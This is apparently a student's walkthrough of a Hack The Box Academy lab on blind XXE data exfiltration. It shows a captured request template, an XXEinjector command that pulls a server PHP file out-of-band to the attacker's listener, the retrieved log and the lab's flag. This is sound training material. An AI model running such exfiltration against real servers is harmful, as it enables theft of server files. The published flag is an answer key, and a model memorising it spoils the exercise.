# Section 16: Blind Data Exfiltration

Module: 23. Web Attacks

---

## Questions & Answers

### 1. Using Blind Data Exfiltration on the '/blind' page to read the content of '/327a6c4304ad5938eaf0efb6cc3e53dc.php' and get the flag.

Context:
```bash
┌─[eu-academy-2]─[10.10.14.37]─[htb-ac-2162140@htb-14bkfga7f9-htb-cloud-com]─[~/XXEinjector]
└──╼ [★]$ cat request.txt
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.206.143
Content-Length: 137
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.206.143
Referer: http://10.129.206.143/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
┌─[eu-academy-2]─[10.10.14.37]─[htb-ac-2162140@htb-14bkfga7f9-htb-cloud-com]─[~/XXEinjector]
└──╼ [★]$ ruby XXEinjector.rb --host=10.10.14.37 --httpport=8000 --file=request.txt --path=/327a6c4304ad5938eaf0efb6cc3e53dc.php --oob=http --phpfilter
XXEinjector by Jakub Pałaczyński

Enumeration options:
"y" - enumerate currect file (default)
"n" - skip currect file
"a" - enumerate all files in currect directory
"s" - skip all files in currect directory
"q" - quit

[-] Multiple instances of XML found. It may results in false-positives.
[+] Sending request with malicious XML.
[+] Responding with XML for: /327a6c4304ad5938eaf0efb6cc3e53dc.php
[+] Retrieved data:
[+] Nothing else to do. Exiting.
┌─[eu-academy-2]─[10.10.14.37]─[htb-ac-2162140@htb-14bkfga7f9-htb-cloud-com]─[~/XXEinjector]
└──╼ [★]$ ls
Logs  README.md  request.txt  XXEinjector.rb
┌─[eu-academy-2]─[10.10.14.37]─[htb-ac-2162140@htb-14bkfga7f9-htb-cloud-com]─[~/XXEinjector]
└──╼ [★]$ ls Logs
10.129.206.143
┌─[eu-academy-2]─[10.10.14.37]─[htb-ac-2162140@htb-14bkfga7f9-htb-cloud-com]─[~/XXEinjector]
└──╼ [★]$ ls Logs/10.129.206.143/
327a6c4304ad5938eaf0efb6cc3e53dc.php  327a6c4304ad5938eaf0efb6cc3e53dc.php.log
┌─[eu-academy-2]─[10.10.14.37]─[htb-ac-2162140@htb-14bkfga7f9-htb-cloud-com]─[~/XXEinjector]
└──╼ [★]$ cat Logs/10.129.206.143/327a6c4304ad5938eaf0efb6cc3e53dc.php
cat: Logs/10.129.206.143/327a6c4304ad5938eaf0efb6cc3e53dc.php: Is a directory
┌─[eu-academy-2]─[10.10.14.37]─[htb-ac-2162140@htb-14bkfga7f9-htb-cloud-com]─[~/XXEinjector]
└──╼ [★]$ cat Logs/10.129.206.143/327a6c4304ad5938eaf0efb6cc3e53dc.php.log
<?php $flag = "HTB{1_d0n7_n33d_0u7pu7_70_3xf1l7r473_d474}"; ?>
```

**Answer:** `HTB{1_d0n7_n33d_0u7pu7_70_3xf1l7r473_d474}`

---

[Back to Module Index](./README.md)
